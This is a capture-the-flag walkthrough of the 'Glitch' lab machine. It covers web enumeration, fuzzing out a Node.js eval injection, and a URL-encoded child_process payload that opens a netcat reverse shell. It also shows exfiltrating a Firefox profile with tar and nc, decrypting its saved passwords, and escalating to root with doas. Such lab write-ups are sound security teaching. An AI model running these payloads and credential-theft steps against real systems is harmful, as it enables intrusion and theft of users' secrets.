## Glitch

# Enumeration
```
# Nmap 7.91 scan initiated Mon Apr 19 21:07:14 2021 as: nmap -sC -sV -oN nmap/initial 10.10.16.30
Nmap scan report for 10.10.16.30
Host is up (0.17s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: not allowed
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr 19 21:07:43 2021 -- 1 IP address (1 host up) scanned in 28.45 seconds
```
Looks like just a web server running on port 80 so lets check it out

# Web Server
Looking at the source code on port 80 we find the following
```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>not allowed</title>

    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      body {
        height: 100vh;
        width: 100%;
        background: url('img/glitch.jpg') no-repeat center center / cover;
      }
    </style>
  </head>
  <body>
    <script>
      function getAccess() {
        fetch('/api/access')
          .then((response) => response.json())
          .then((response) => {
            console.log(response);
          });
      }
    </script>
  </body>
</html>
```
Look like a function getAccess() is present that makes a GET request from /api/access and logs the response to the console. It is never called, but we can use developer tools to call it and get the output.
Object { token: "dGhpc19pc19ub3RfcmVhbA==" }

echo "dGhpc19pc19ub3RfcmVhbA==" | base64 -d
redacted access token

Looking at the stored cookies we find one called token and here we can place the access token value to gain access to the actual site.
There doesn't seem to be much of interest to progress further besides a link /js/script.js which contains the following
```
(async function () {
  const container = document.getElementById('items');
  await fetch('/api/items')
    .then((response) => response.json())
    .then((response) => {
      response.sins.forEach((element) => {
        let el = `<div class="item sins"><div class="img-wrapper"></div><h3>${element}</h3></div>`;
        container.insertAdjacentHTML('beforeend', el);
      });
      response.errors.forEach((element) => {
        let el = `<div class="item errors"><div class="img-wrapper"></div><h3>${element}</h3></div>`;
        container.insertAdjacentHTML('beforeend', el);
      });
      response.deaths.forEach((element) => {
        let el = `<div class="item deaths"><div class="img-wrapper"></div><h3>${element}</h3></div>`;
        container.insertAdjacentHTML('beforeend', el);
      });
    });

  const buttons = document.querySelectorAll('.btn');
  const items = document.querySelectorAll('.item');
  buttons.forEach((button) => {
    button.addEventListener('click', (event) => {
      event.preventDefault();
      const filter = event.target.innerText;
      items.forEach((item) => {
        if (filter === 'all') {
          item.style.display = 'flex';
        } else {
          if (item.classList.contains(filter)) {
            item.style.display = 'flex';
          } else {
            item.style.display = 'none';
          }
        }
      });
    });
  });
})();

```
Lets try and play with the api and send a POST request to /api/items, to which we get the following
```
curl -X POST http://10.10.16.30/api/items
{"message":"there_is_a_glitch_in_the_matrix"}
```
so lets fuzz this to find something viable to use
```
wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt -X POST --hh 45 -u http://10.10.16.30/api/items\?FUZZ\=test
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.16.30/api/items?FUZZ=test
Total requests: 951

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000179:   500        10 L     64 W       1081 Ch     "cmd"

Total time: 18.65337
Processed Requests: 951
Filtered Requests: 950
Requests/sec.: 50.98273
```
Sending a POST request gives us the following error
```
curl -X POST http://10.10.16.30/api/items?cmd=test                                                                
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>ReferenceError: test is not defined<br> &nbsp; &nbsp;at eval (eval at router.post (/var/web/routes/api.js:25:60), &lt;anonymous&gt;:1:1)<br> &nbsp; &nbsp;at router.post (/var/web/routes/api.js:25:60)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/var/web/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /var/web/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/var/web/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/index.js:275:10)<br> &nbsp; &nbsp;at Function.handle (/var/web/node_modules/express/lib/router/index.js:174:3)</pre>
</body>
</html>
```
It seems like it is attempting to take our argument and pass it to the eval function which evaluates javascript in Node.js. We search up RCE for Node.js and find the following article 
https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44
Looks like we can exploit this eval function to obtain a reverse shell
```
curl -X POST http://10.10.16.30/api/items?cmd=require%28%27child_process%27%29.exec%28%27rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.13.1.12%204242%20%3E%2Ftmp%2Ff%27%29
```
We now have a shell spawned and can find the user flag in the home directory of user

# Privilege Escalation
We find a .firefox directory with a profile amidst others and can use a script firefox_decrypt to extract the information. 
On target
```
tar cf - .firefox/ | nc <our ip> <our port>
```

On our box
```
nc -lvp <our port> | tar xf -
```

we can then use the script as follow
```
./firefox_decrypt.py ../.firefox/b5w4643p.default-release
2021-04-19 22:29:44,453 - WARNING - profile.ini not found in ../.firefox/b5w4643p.default-release
2021-04-19 22:29:44,453 - WARNING - Continuing and assuming '../.firefox/b5w4643p.default-release' is a profile location

Website:   https://glitch.thm
Username: 'v0id'
Password: 'redacted'
```

We can use this password to login as the v0id user.
At this point however we can't really find anything to escalate further, so we can look at the hint and says sudo is bloat. Looking this up we find a video and links talking about using doas instead so lets give it a try
```
v0id@ubuntu:~$ sudo -l
[sudo] password for v0id:
Sorry, user v0id may not run sudo on ubuntu.
v0id@ubuntu:~$ doas -u root /bin/bash
Password:
root@ubuntu:/home/v0id# cd /root
root@ubuntu:~# ls
clean.sh  root.txt
```
And there we go we have root and the flag
